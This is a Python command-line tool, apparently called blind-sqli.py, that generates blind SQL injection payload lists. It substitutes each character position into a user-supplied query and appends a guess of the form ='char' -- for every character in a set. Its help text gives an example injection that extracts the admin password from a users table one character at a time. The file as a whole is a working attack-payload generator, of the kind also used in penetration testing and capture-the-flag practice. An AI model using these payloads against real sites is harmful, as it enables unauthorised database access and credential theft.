import requests
import click
from colorama import Fore, Back
import re
from time import sleep

kaonashi_art = f"""{Fore.MAGENTA}
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⣀⣀⣤⣤⣄⣀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⢀⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣷⡀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢠⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠹⣿⡄⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⣾⡟⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢹⣿⡄⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣻⡇⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⣼⣿⣧⣤⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⡇⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⣿⠟⠉⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠙⠇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⣿⣦⣀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡤⢀⣀⡠⣴⡇⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣉⣁⣁⣉⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⣀⣤⣽⡇⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡏⠁⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠈⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣰⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣦⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿
⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣶⣦⣴⣶⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿
⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿
⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿
⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿
{Fore.RESET}"""

char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.,;:/|\'\"{}()_[]@#$%^*<>?"

def gen_list(payload, output, length):
      input_str = payload
      pattern = r'1'
      match = re.search(pattern, input_str)
      position = 1
      number = int(length)

      if match:         
         try:
            while number > 0:
               for char in char_set:
                  payload_final = re.sub(pattern, f"{str(position)}", input_str, 1)
                  payload_final += f"='{char}' --"
                  if output:
                     try:
                        with open(output, "a") as f:
                           f.write(f"{payload_final}\n")
                     except Exception as e:
                        print(f"{Fore.RED}[-] An error occured while writing to file: {e}{Fore.RESET}")
                        return 1
                  else:
                     print(payload_final)

               position += 1
               number -= 1
         except Exception as e:
            print(f"{Fore.RED}[-] An error occured: {e}{Fore.RESET}")
            return 1
      else:
         print(f"""{Fore.RED}[-] Error. The input string does not seems to be a Blind SQLi query.\n 
{Fore.LIGHTCYAN_EX}[!] The query should only be in the following format:
{Fore.YELLOW}`hello' OR (SELECT SUBSTR(password, 1, 1) FROM users WHERE username='admin')`\n
{Fore.LIGHTCYAN_EX}[!] The script will generate a payload list by adding `='{{char}}' -- ` at the end.\n{Fore.RESET}""")
         return 1
      

@click.group()
@click.option('--hush', is_flag=True, help="Suppress ASCII art printing.")
def main(hush):
   if not hush:
      print(kaonashi_art)
   else:
      print(f"{Fore.MAGENTA}[/] ASCII art printing suppressed.\n")


@click.command()
@click.option('-p', '--payload', help="The payload string to iterate over. Required.")
@click.option('-o', '--output', help="File path to write contents in. Optional.", default=None)
@click.option('-l', '--length', help="Number of times to repeat the payload, e.g. if length is 10, the script will iterate over all characters 10 times.", default=1)
def genlist(payload, output, length):
   if payload:
      try:
         if output:
            print(f"{Fore.LIGHTBLACK_EX}[\] Running genlist command...\n{Fore.RESET}")
            val = gen_list(payload, output, length)
            if val != 1:
               print(f"{Fore.GREEN}[+] Success! Payload list created at `{output}`.{Fore.RESET}")
         else:
            print(f"{Fore.LIGHTBLACK_EX}[\] Running genlist command...\n{Fore.RESET}")
            print(f"{Fore.BLUE}[!] No output file specified. Printing to stdout. This might mess up your terminal. Try outputting to a file with -o option.\n{Fore.RESET}")
            sleep(1)
            output = None
            val = gen_list(payload, output, length)
      except Exception as e:
         print(f"{Fore.RED}[-] An error occured. {e}{Fore.RESET}")
      except KeyboardInterrupt:
         print(f"{Fore.YELLOW}[!] User raised KeyboardInterrupt. Exiting...{Fore.RESET}")
   elif not payload:
      print(f"{Fore.RED}[-] Error. The payload to iterate over is required. Try again with -p option or try `python blind-sqli.py --help` for more info.{Fore.RESET}")
   else:
      print(f"{Fore.RED}[-] Something went wrong. See usage info with `python blind-sqli.py --help`.")


main.add_command(genlist)


if __name__=="__main__":
   main()
